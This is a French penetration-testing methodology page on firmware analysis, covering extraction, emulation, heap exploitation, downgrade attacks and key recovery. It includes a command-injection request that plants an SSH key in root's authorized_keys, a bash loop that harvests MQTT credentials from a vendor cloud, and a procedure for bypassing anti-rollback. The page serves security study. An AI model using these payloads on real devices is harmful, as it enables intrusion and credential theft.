# Analyse du firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introduction**

### Ressources connexes


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Le firmware est un logiciel essentiel qui permet aux appareils de fonctionner correctement en gérant et en facilitant la communication entre les composants matériels et les logiciels avec lesquels les utilisateurs interagissent. Il est stocké dans une mémoire permanente, ce qui garantit que l'appareil peut accéder aux instructions essentielles dès sa mise sous tension et lancer le système d'exploitation. L'examen et la modification potentielle du firmware constituent une étape critique pour identifier les vulnérabilités de sécurité.<sup>[[2]](#references)[[3]](#references)</sup>

## **Collecte d'informations**

La **collecte d'informations** est une première étape essentielle pour comprendre la composition d'un appareil et les technologies qu'il utilise. Ce processus consiste à recueillir des données sur :

- L'architecture du CPU et le système d'exploitation utilisé
- Les détails du bootloader
- La disposition matérielle et les datasheets
- Les métriques de la codebase et les emplacements du source code
- Les bibliothèques externes et les types de licences
- L'historique des mises à jour et les certifications réglementaires
- Les diagrammes d'architecture et de flux
- Les évaluations de sécurité et les vulnérabilités identifiées

À cette fin, les outils d'**open-source intelligence (OSINT)** sont précieux, tout comme l'analyse des composants logiciels open source disponibles au moyen de processus de revue manuels et automatisés. Des outils comme [Coverity Scan](https://scan.coverity.com) et [LGTM de Semmle](https://lgtm.com/#explore) proposent une analyse statique gratuite pouvant être utilisée pour détecter des problèmes potentiels.

## **Obtention du firmware**

L'obtention du firmware peut se faire de différentes manières, chacune présentant un niveau de complexité propre :

- **Directement** auprès de la source (développeurs, fabricants)
- En le **compilant** à partir des instructions fournies
- En le **téléchargeant** depuis les sites officiels de support
- En utilisant des requêtes **Google dork** pour trouver des fichiers de firmware hébergés
- En accédant directement au **cloud storage**, avec des outils comme [S3Scanner](https://github.com/sa7mon/S3Scanner)
- En interceptant les **mises à jour** au moyen de techniques man-in-the-middle
- En l'**extrayant** de l'appareil via des connexions comme **UART**, **JTAG** ou **PICit**
- En **sniffant** les requêtes de mise à jour dans les communications de l'appareil
- En identifiant et en utilisant des **endpoints de mise à jour hardcodés**
- En effectuant un **dump** depuis le bootloader ou le réseau
- En **retirant et lisant** la puce de stockage, lorsque toutes les autres méthodes échouent, à l'aide des outils matériels appropriés

### Logs UART uniquement : forcer un root shell via l'environnement U-Boot dans la flash

Si UART RX est ignoré (logs uniquement), vous pouvez tout de même forcer un init shell en **modifiant offline le blob de l'environnement U-Boot** :<sup>[[6]](#references)</sup>

1. Effectuez un dump de la SPI flash avec une pince SOIC-8 et un programmer (3,3 V) :
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Localisez la partition de l'environnement U-Boot, modifiez `bootargs` pour y inclure `init=/bin/sh`, puis **recalculez le CRC32 de l'environnement U-Boot** pour le blob.
3. Reflashez uniquement la partition de l'environnement et redémarrez ; un shell devrait apparaître sur UART.

Cette méthode est utile sur les appareils embedded lorsque le shell du bootloader est désactivé, mais que la partition d'environnement est accessible en écriture via un accès externe à la flash.

## Analyse du firmware

Maintenant que vous **avez le firmware**, vous devez en extraire les informations afin de savoir comment le traiter. Voici différents outils que vous pouvez utiliser pour cela :
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Si vous ne trouvez pas grand-chose avec ces outils, vérifiez l’**entropie** de l’image avec `binwalk -E <bin>` ; si l’entropie est faible, elle n’est probablement pas chiffrée. Si l’entropie est élevée, elle est probablement chiffrée (ou compressée d’une manière ou d’une autre).

De plus, vous pouvez utiliser ces outils pour extraire les **fichiers intégrés au firmware** :

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) pour inspecter le fichier.

### Obtention du système de fichiers

Avec les outils commentés précédemment, comme `binwalk -ev <bin>`, vous devriez avoir pu **extraire le système de fichiers**.\
Binwalk l’extrait généralement dans un **dossier portant le nom du type de système de fichiers**, qui est habituellement l’un des suivants : squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extraction manuelle du système de fichiers

Parfois, binwalk **ne possède pas l’octet magique du système de fichiers dans ses signatures**. Dans ce cas, utilisez binwalk pour **trouver l’offset du système de fichiers, puis extraire le système de fichiers compressé** du binaire et **extraire manuellement** le système de fichiers selon son type, en suivant les étapes ci-dessous.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Exécutez la commande **dd** suivante pour extraire le système de fichiers Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativement, la commande suivante peut également être exécutée.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Pour squashfs (utilisé dans l'exemple ci-dessus)

`$ unsquashfs dir.squashfs`

Les fichiers se trouveront ensuite dans le répertoire "`squashfs-root`".

- Fichiers d'archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Pour les systèmes de fichiers jffs2

`$ jefferson rootfsfile.jffs2`

- Pour les systèmes de fichiers ubifs avec mémoire flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analyse du firmware

Une fois le firmware obtenu, il est essentiel de l'examiner en détail afin de comprendre sa structure et ses vulnérabilités potentielles. Ce processus implique l'utilisation de divers outils pour analyser et extraire des données utiles de l'image du firmware.

### Outils d'analyse initiale

Un ensemble de commandes est fourni pour l'inspection initiale du fichier binaire (désigné par `<bin>`). Ces commandes permettent d'identifier les types de fichiers, d'extraire les chaînes de caractères, d'analyser les données binaires et de comprendre les détails des partitions et du système de fichiers :
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Pour évaluer l’état du chiffrement de l’image, on vérifie l’**entropie** avec `binwalk -E <bin>`. Une faible entropie suggère l’absence de chiffrement, tandis qu’une entropie élevée indique un chiffrement ou une compression possible.

Pour extraire les **fichiers intégrés**, des outils et ressources comme la documentation **file-data-carving-recovery-tools** et **binvis.io** pour l’inspection des fichiers sont recommandés.

### Extraction du système de fichiers

Avec `binwalk -ev <bin>`, on peut généralement extraire le système de fichiers, souvent dans un répertoire portant le nom du type de système de fichiers (par exemple, squashfs ou ubifs). Cependant, lorsque **binwalk** ne parvient pas à reconnaître le type de système de fichiers en raison de l’absence de magic bytes, une extraction manuelle est nécessaire. Elle consiste à utiliser `binwalk` pour localiser l’offset du système de fichiers, puis la commande `dd` pour extraire le système de fichiers :
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Ensuite, selon le type de système de fichiers (par exemple, squashfs, cpio, jffs2, ubifs), différentes commandes sont utilisées pour extraire manuellement le contenu.

### Analyse du système de fichiers

Une fois le système de fichiers extrait, la recherche de failles de sécurité commence. L’attention porte sur les daemons réseau non sécurisés, les identifiants codés en dur, les endpoints d’API, les fonctionnalités des serveurs de mise à jour, le code non compilé, les scripts de démarrage et les binaires compilés destinés à une analyse offline.

Les **emplacements** et **éléments clés** à inspecter incluent :

- **etc/shadow** et **etc/passwd** pour les identifiants utilisateur
- Les certificats et clés SSL dans **etc/ssl**
- Les fichiers de configuration et les scripts à la recherche de vulnérabilités potentielles
- Les binaires embarqués pour une analyse approfondie
- Les serveurs web et binaires courants des appareils IoT

Plusieurs outils permettent de révéler des informations sensibles et des vulnérabilités au sein du système de fichiers :

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) et [**Firmwalker**](https://github.com/craigz28/firmwalker) pour rechercher des informations sensibles
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) pour une analyse complète du firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) et [**EMBA**](https://github.com/e-m-b-a/emba) pour l’analyse statique et dynamique

### Contrôles de sécurité sur les binaires compilés

Le code source et les binaires compilés trouvés dans le système de fichiers doivent être examinés à la recherche de vulnérabilités. Des outils comme **checksec.sh** pour les binaires Unix et **PESecurity** pour les binaires Windows permettent d’identifier les binaires non protégés susceptibles d’être exploités.

## Récupération de la configuration cloud et des identifiants MQTT via des tokens d’URL dérivés

De nombreux hubs IoT récupèrent leur configuration propre à chaque appareil depuis un endpoint cloud qui ressemble à ceci :<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Lors de l’analyse du firmware, vous pouvez découvrir que `<token>` est dérivé localement de l’identifiant de l’appareil à l’aide d’un secret codé en dur, par exemple :

- token = MD5( deviceId || STATIC_KEY ) et représenté sous forme hexadécimale en majuscules

Cette conception permet à toute personne connaissant un deviceId et le STATIC_KEY de reconstruire l’URL et de récupérer la configuration cloud, révélant souvent des identifiants MQTT en clair et des préfixes de topics.

Workflow pratique :

1) Extraire le deviceId des logs de démarrage UART

- Connecter un adaptateur UART 3,3 V (TX/RX/GND) et capturer les logs :
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Recherchez les lignes qui affichent le motif d’URL de la configuration cloud et l’adresse du broker, par exemple :
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Récupérer STATIC_KEY et l’algorithme du token depuis le firmware

- Charger les binaires dans Ghidra/radare2 et rechercher le chemin de configuration ("/pf/") ou l’utilisation de MD5.
- Confirmer l’algorithme (par ex. MD5(deviceId||STATIC_KEY)).
- Dériver le token dans Bash et mettre le digest en majuscules :
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Récupérer la configuration cloud et les identifiants MQTT

- Composez l’URL et récupérez le JSON avec curl ; analysez-le avec jq pour extraire les secrets :
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abuser du MQTT en clair et des ACL faibles sur les topics (si présentes)

- Utiliser les identifiants récupérés pour s’abonner aux topics de maintenance et rechercher des événements sensibles :
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Énumérer les identifiants d’appareils prévisibles (à grande échelle, avec autorisation)

- De nombreux écosystèmes intègrent des octets OUI/produit/type du fabricant, suivis d’un suffixe séquentiel.
- Vous pouvez parcourir les identifiants candidats, dériver des tokens et récupérer les configurations par programmation :
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- Obtenez toujours une autorisation explicite avant toute tentative d’énumération à grande échelle.
- Privilégiez l’émulation ou l’analyse statique pour récupérer les secrets sans modifier le matériel cible lorsque cela est possible.


Le processus d’émulation du firmware permet d’effectuer une **analyse dynamique**, soit du fonctionnement d’un appareil, soit d’un programme individuel. Cette approche peut rencontrer des difficultés liées aux dépendances matérielles ou à l’architecture, mais le transfert du système de fichiers racine ou de binaires spécifiques vers un appareil doté d’une architecture et d’une endianness correspondantes, comme un Raspberry Pi, ou vers une machine virtuelle préconfigurée, peut faciliter la poursuite des tests.

### Émulation de binaires individuels

Pour examiner des programmes individuels, il est essentiel d’identifier leur endianness et leur architecture CPU.

#### Exemple avec l’architecture MIPS

Pour émuler un binaire destiné à l’architecture MIPS, vous pouvez utiliser la commande :
```bash
file ./squashfs-root/bin/busybox
```
Et pour installer les outils d’émulation nécessaires :
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Pour MIPS (big-endian), `qemu-mips` est utilisé, tandis que pour les binaires little-endian, `qemu-mipsel` serait le choix approprié.

#### Émulation de l'architecture ARM

Pour les binaires ARM, le processus est similaire, avec l'émulateur `qemu-arm` utilisé pour l'émulation.

### Émulation complète du système

Des outils comme [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) et d'autres permettent l'émulation complète du firmware, en automatisant le processus et en facilitant l'analyse dynamique.

## Analyse dynamique en pratique

À ce stade, un environnement de périphérique réel ou émulé est utilisé pour l'analyse. Il est essentiel de conserver un accès shell au système d'exploitation et au système de fichiers. L'émulation peut ne pas reproduire parfaitement les interactions matérielles, ce qui peut nécessiter le redémarrage occasionnel de l'émulation. L'analyse doit réexaminer le système de fichiers, exploiter les webpages et services réseau exposés, et rechercher les vulnérabilités du bootloader. Les tests d'intégrité du firmware sont essentiels pour identifier les vulnérabilités potentielles de backdoor.

## Techniques d'analyse runtime

L'analyse runtime consiste à interagir avec un processus ou un binaire dans son environnement d'exécution, à l'aide d'outils comme gdb-multiarch, Frida et Ghidra pour définir des points d'arrêt et identifier les vulnérabilités grâce au fuzzing et à d'autres techniques.

Pour les cibles embarquées dépourvues d'un debugger complet, **copiez un `gdbserver` lié statiquement** sur le périphérique et attachez-vous à distance :<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Mappage des messages Zigbee / radio-co-processor

Sur les hubs IoT, la stack RF est souvent répartie entre un **MCU radio** et un processus Linux en userland. Un workflow utile consiste à mapper le chemin :<sup>[[8]](#references)</sup>

1. **Trame RF** dans les airs
2. **parser côté contrôleur** sur le MCU radio
3. **protocole texte série/UART ou TLV** transmis à Linux (par exemple `/dev/tty*`)
4. **dispatcher applicatif** dans le daemon principal
5. **handler spécifique au protocole / machine à états**

Cette architecture crée deux cibles de reverse engineering au lieu d’une. Si le contrôleur convertit les trames radio binaires en un protocole textuel tel que `Group,Command,arg1,arg2,...`, récupérez :

- Les **groupes de messages** et les tables de dispatch
- Les messages pouvant provenir du **réseau** par opposition à ceux provenant du contrôleur lui-même
- Les champs discriminateurs exacts spécifiques au fabricant (par exemple Zigbee `manufacturer_code` et `cluster_command` personnalisés)
- Les handlers uniquement accessibles pendant les phases de **commissioning**, de découverte ou de téléchargement du firmware/modèle

Pour Zigbee spécifiquement, capturez le trafic de pairing et vérifiez si la cible utilise encore la **Link Key** par défaut `ZigBeeAlliance09`. Si c’est le cas, le sniffing du trafic de commissioning peut révéler la **Network Key**. Les install codes de Zigbee 3.0 réduisent cette exposition ; notez donc si l’appareil testé les applique réellement.

### Handlers de protocoles spécifiques au fabricant et accessibilité contrôlée par une FSM

Les commandes Zigbee/ZCL spécifiques au vendor sont souvent une meilleure cible que les clusters standardisés, car elles alimentent du **code de parsing personnalisé** et des **FSMs** internes avec une validation moins éprouvée.<sup>[[8]](#references)</sup>

Workflow pratique :

- Reversez le dispatcher de commandes jusqu’à trouver le **handler réservé au vendor**.
- Récupérez les tables **d’état de la FSM**, **d’événements**, de **checks**, d’**actions** et d’**états suivants**.
- Identifiez les **états transitoires** qui avancent automatiquement, ainsi que les branches de retry/error qui finissent par réinitialiser ou libérer l’état contrôlé par l’attaquant.
- Confirmez quels échanges légitimes du protocole sont nécessaires pour placer le daemon dans l’état vulnérable, au lieu de supposer que le handler défectueux est toujours accessible.

Pour les protocoles sensibles au timing, le replay de paquets depuis un framework Python peut être trop lent. Une approche plus fiable consiste à émuler un appareil légitime sur du matériel réel (par exemple un **nRF52840**) avec une stack de niveau vendor afin d’exposer les bons **endpoints**, **attributs** et le timing de commissioning.

### Classe de bugs liés aux téléchargements fragmentés dans les daemons embarqués

Une classe récurrente de bugs firmware apparaît dans les **téléchargements fragmentés de blobs/modèles/configurations** :<sup>[[8]](#references)</sup>

1. Le **premier fragment** (`offset == 0`) stocke `ctx->total_size` et alloue `malloc(total_size)`.
2. Les fragments suivants valident uniquement les champs contrôlés par l’attaquant et propres au **paquet**, tels que `packet_total_size >= offset + chunk_len`.
3. La copie utilise `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sans vérifier la taille allouée à l’origine.

Cela permet à un attaquant d’envoyer :

- Un premier fragment valide avec une **taille totale déclarée faible** afin de forcer une petite allocation heap.
- Un fragment ultérieur avec l’**offset attendu**, mais une valeur `chunk_len` plus grande.
- Une taille propre au paquet forgée qui satisfait les nouveaux checks tout en provoquant un overflow du buffer alloué à l’origine.

Lorsque le chemin vulnérable se trouve derrière une logique de commissioning, l’exploitation doit inclure suffisamment d’**émulation d’appareil** pour amener la cible dans l’état attendu de téléchargement du modèle ou du blob avant d’envoyer les fragments malformés.

### Triggers `free()` pilotés par le protocole

Dans les daemons embarqués, le moyen le plus simple de déclencher une exploitation des métadonnées du heap n’est souvent pas « attendre le cleanup », mais de **forcer la gestion d’erreurs du protocole** :<sup>[[8]](#references)</sup>

- Envoyer des fragments de suivi malformés pour faire passer la FSM dans des états de **retry** ou d’**error**.
- Dépasser le seuil de retry afin que le daemon **réinitialise le contexte** et libère le buffer corrompu.
- Utiliser ce `free()` prévisible pour déclencher des primitives côté allocator avant que le processus ne crash pour des raisons sans rapport.

Cette méthode est particulièrement utile contre les allocators de type **musl/uClibc/dlmalloc** dans Linux embarqué, où la corruption des métadonnées de chunks peut transformer la logique unlink/unbin en primitive d’écriture. Une approche stable consiste à corrompre un **champ de taille** afin de rediriger le parcours de l’allocator vers de **faux chunks placés dans le buffer overflowé**, au lieu d’écraser immédiatement de vrais pointeurs de bins et de faire crasher le processus.

## Binary Exploitation et Proof-of-Concept

Le développement d’un PoC pour les vulnérabilités identifiées nécessite une compréhension approfondie de l’architecture de la cible et une programmation dans des langages de plus bas niveau. Les protections runtime binaires sont rares dans les systèmes embarqués, mais lorsqu’elles sont présentes, des techniques comme le Return Oriented Programming (ROP) peuvent être nécessaires.

### Notes sur l’exploitation des fastbins de uClibc (Linux embarqué)

- **Fastbins + consolidation :** uClibc utilise des fastbins similaires à ceux de glibc. Une allocation large ultérieure peut déclencher `__malloc_consolidate()`, de sorte que tout faux chunk doit survivre aux checks (taille cohérente, `fd = 0` et chunks voisins considérés comme « in use »).<sup>[[6]](#references)</sup>
- **Binaires non-PIE sous ASLR :** si l’ASLR est activé mais que le binaire principal est **non-PIE**, les adresses `.data/.bss` dans le binaire sont stables. Vous pouvez cibler une région qui ressemble déjà à un header de chunk heap valide afin de faire aboutir une allocation fastbin sur une **table de pointeurs de fonctions**.
- **NUL arrêtant le parser :** lorsque le JSON est parsé, un `\x00` dans le payload peut arrêter le parsing tout en conservant les octets contrôlés par l’attaquant qui suivent pour une stack pivot/chaîne ROP.
- **Shellcode via `/proc/self/mem` :** une chaîne ROP qui appelle `open("/proc/self/mem")`, `lseek()` et `write()` peut placer du shellcode exécutable dans une mapping connue et y effectuer un jump.

## Systèmes d’exploitation préparés pour l’analyse de firmware

Des systèmes d’exploitation comme [AttifyOS](https://github.com/adi0x90/attifyos) et [EmbedOS](https://github.com/scriptingxss/EmbedOS) fournissent des environnements préconfigurés pour les tests de sécurité firmware, équipés des outils nécessaires.

## OS préparés pour analyser le firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos) : AttifyOS est une distro destinée à vous aider à réaliser l’évaluation de sécurité et le penetration testing d’appareils Internet of Things (IoT). Elle vous fait gagner beaucoup de temps en fournissant un environnement préconfiguré avec tous les outils nécessaires déjà installés.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS) : système d’exploitation de test de sécurité embarqué basé sur Ubuntu 18.04, préchargé avec des outils de test de sécurité firmware.

## Attaques de downgrade du firmware et mécanismes de mise à jour non sécurisés

Même lorsqu’un vendor implémente des vérifications de signatures cryptographiques pour les images firmware, la **protection contre le version rollback (downgrade)** est fréquemment absente. Lorsque le bootloader ou le recovery-loader vérifie uniquement la signature avec une clé publique intégrée, sans comparer la *version* (ou un compteur monotone) de l’image flashée, un attaquant peut légitimement installer un **firmware plus ancien et vulnérable portant toujours une signature valide**, réintroduisant ainsi des vulnérabilités corrigées.<sup>[[4]](#references)</sup>

Workflow d’attaque typique :

1. **Obtenir une ancienne image signée**
* La récupérer depuis le portail public de téléchargement du vendor, son CDN ou son site de support.
* L’extraire des applications mobiles/de bureau associées (par exemple à l’intérieur d’un APK Android sous `assets/firmware/`).
* La récupérer depuis des dépôts tiers tels que VirusTotal, des archives Internet, des forums, etc.
2. **Uploader ou servir l’image à l’appareil** via n’importe quel canal de mise à jour exposé :
* Web UI, API d’application mobile, USB, TFTP, MQTT, etc.
* De nombreux appareils IoT grand public exposent des endpoints HTTP(S) *non authentifiés* qui acceptent des blobs firmware encodés en Base64, les décodent côté serveur et déclenchent une récupération/mise à niveau.
3. Après le downgrade, exploiter une vulnérabilité corrigée dans la version plus récente (par exemple un filtre de command injection ajouté ultérieurement).
4. Facultativement, reflasher la dernière image ou désactiver les mises à jour afin d’éviter la détection une fois la persistance obtenue.

### Exemple : Command Injection après un downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Dans le firmware vulnérable (downgradé), le paramètre `md5` est directement concaténé à une commande shell sans assainissement, ce qui permet d’injecter des commandes arbitraires (ici, pour activer un accès root par clé SSH). Les versions ultérieures du firmware ont introduit un filtre basique des caractères, mais l’absence de protection contre le downgrade rend ce correctif inutile.<sup>[[4]](#references)</sup>

### Extraction du firmware depuis les applications mobiles

De nombreux fournisseurs incluent des images complètes du firmware dans leurs applications mobiles compagnon afin que l’application puisse mettre à jour l’appareil via Bluetooth/Wi-Fi. Ces paquets sont généralement stockés sans chiffrement dans l’APK/APEX, sous des chemins tels que `assets/fw/` ou `res/raw/`. Des outils comme `apktool`, `ghidra`, ou même le simple outil `unzip`, permettent d’extraire les images signées sans accéder au matériel physique.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Contournement de l’anti-rollback limité à l’updater dans les designs à slots A/B

Certains vendors implémentent bien un **ratchet** anti-downgrade, mais uniquement dans la logique de l’*updater* (par exemple une routine UDS via CAN, une commande de recovery ou un agent OTA en userspace). Si le **bootloader** vérifie ensuite uniquement la signature/CRC de l’image et fait confiance à la table de partitions ou aux métadonnées du slot, la protection contre le rollback peut toujours être contournée.<sup>[[7]](#references)</sup>

Design faible typique :

- Les métadonnées du firmware contiennent à la fois un descripteur de version et un **security ratchet** / compteur monotone.
- L’updater compare le ratchet de l’image à une valeur stockée dans le stockage persistant et rejette les anciennes images signées.
- Le bootloader n’analyse **pas** ce ratchet et vérifie uniquement le header, le CRC et la signature avant de démarrer le slot sélectionné.
- L’activation du slot est stockée séparément dans une table de partitions ou un compteur de génération par slot, et n’est **pas liée cryptographiquement** au digest exact du firmware qui a été validé.

Cela crée une primitive **validate-one-image / boot-another-image** dans les systèmes à deux slots. Si l’attaquant peut faire marquer le slot B comme prochaine cible de boot par l’updater en utilisant une image signée actuelle, puis écraser le slot B avant le reboot, le bootloader peut tout de même démarrer l’image downgradée, car il ne fait confiance qu’aux métadonnées de slot déjà validées.

Procédure d’abus courante :

1. Uploader un firmware **actuel et signé** dans le slot passif, puis exécuter la routine normale de validation/basculement afin que la configuration marque ce slot comme prochain slot actif.
2. **Ne pas redémarrer tout de suite**. Réentrer dans la routine de préparation/effacement du slot au cours de la même session.
3. Exploiter une logique obsolète de l’état du boot ou de sélection du slot afin que l’updater efface le **même slot physique** que celui qui vient d’être promu.
4. Écrire un firmware **plus ancien mais toujours signé** dans ce slot.
5. Ignorer la routine de validation qui applique le ratchet et redémarrer directement.
6. Le bootloader sélectionne le slot promu, vérifie uniquement la signature/l’intégrité, puis démarre l’ancienne image.

Points à rechercher lors du reversing des implémentations de mise à jour A/B :

- Sélection du slot dérivée de **flags de boot** qui ne sont pas actualisés après un basculement réussi.
- Routine de type `prepare_passive_slot()` qui efface un slot à partir d’un état obsolète au lieu de la **configuration actuellement validée**.
- Fonction de type `part_write_layout()` qui incrémente uniquement un **compteur de génération** / flag actif et n’enregistre pas le hash de l’image validée.
- Vérifications du ratchet implémentées dans le code userspace ou de l’updater, mais **pas** dans les étapes ROM / bootloader / secure boot.
- Routines d’effacement ou de recovery qui laissent le slot marqué comme bootable même après la suppression et la réécriture de son contenu.

### Checklist pour évaluer la logique de mise à jour

* Le transport/l’authentification de l’*update endpoint* est-il correctement protégé (TLS + authentification) ?
* L’appareil compare-t-il les **numéros de version** ou un **compteur monotone anti-rollback** avant le flashing ?
* L’image est-elle vérifiée dans une chaîne secure boot (par exemple, les signatures sont-elles vérifiées par le code ROM) ?
* Le **bootloader applique-t-il le même ratchet** que l’updater, au lieu de vérifier uniquement la signature/CRC ?
* Les métadonnées d’activation du slot sont-elles **liées au digest/à la version du firmware validé**, ou un slot peut-il être modifié après sa promotion ?
* Après la réussite d’un basculement de slot, l’appareil est-il forcé de redémarrer, ou les routines ultérieures de mise à jour/effacement restent-elles accessibles au cours de la même session ?
* Le code userland effectue-t-il des vérifications de cohérence supplémentaires (par exemple, la carte des partitions autorisées ou le numéro de modèle) ?
* Les flux de mise à jour *partial* ou *backup* réutilisent-ils la même logique de validation ?

> 💡  Si l’un des éléments ci-dessus manque, la plateforme est probablement vulnérable aux attaques de rollback.

## Firmware vulnérable pour s’entraîner

Pour vous entraîner à découvrir des vulnérabilités dans des firmwares, utilisez les projets de firmware vulnérables suivants comme point de départ.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Récupération des clés de déchiffrement du firmware depuis l’état d’un KMS/Vault embarqué

Lorsqu’une image de mise à jour mélange de petites métadonnées en clair avec un large blob à haute entropie, effectuez un triage du conteneur avant toute tentative de brute-force :<sup>[[1]](#references)</sup>

- Extrayez les headers, offsets et limites de lignes avec `hexdump`, `xxd`, `strings -tx`, `base64 -d` et `binwalk -E`.
- `Salted__` signifie généralement un format OpenSSL `enc` : les 8 octets suivants sont le sel et les octets restants sont le ciphertext.
- Un champ Base64 qui se décode exactement en `256` octets indique fortement qu’il s’agit d’un ciphertext RSA-2048 encapsulant un mot de passe de firmware ou une clé de session aléatoire.
- Le matériel PGP détaché présent dans le même fichier protège souvent uniquement l’authenticité ; ne supposez pas qu’il s’agit du mécanisme de confidentialité.

Si la recherche statique de clés (`grep`, `strings`, recherches PEM/PGP) échoue, reversez plutôt le **chemin opérationnel de déchiffrement**, au lieu de rechercher uniquement des clés privées :

- Décompilez le binaire de l’updater / de gestion et suivez qui lit le blob chiffré, quel helper/API le désencapsule et le nom logique de clé qu’il demande.
- Recherchez dans le root filesystem extrait l’état du KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), ainsi que les unit files et les scripts d’init.
- Traitez les commandes `vault operator unseal ...` en clair, les recovery keys, les bootstrap tokens ou les scripts locaux d’auto-unseal du KMS comme des éléments équivalents à du matériel de clé privée.

Si l’appliance fournit le binaire Vault original et le backend de stockage, rejouer cet environnement est généralement plus simple que de réimplémenter les composants internes de Vault :
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
